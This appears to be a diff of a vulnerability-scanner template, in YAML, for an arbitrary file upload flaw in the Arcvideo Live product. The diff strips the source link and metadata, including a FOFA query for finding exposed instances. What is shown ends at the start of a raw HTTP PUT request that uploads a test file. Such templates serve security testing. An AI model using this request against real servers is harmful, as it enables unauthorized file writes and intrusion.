@@ -3,12 +3,8 @@ info:
   name: 当虹科技 Arcvideo Live存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ghzu1duvfnqptpq5'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ghzu1duvfnqptpq5
-    fofa: app="当虹科技-Arcvideo-Live"
 http:
 - raw:
   - 'PUT /js/test123.txt HTTP/1.1
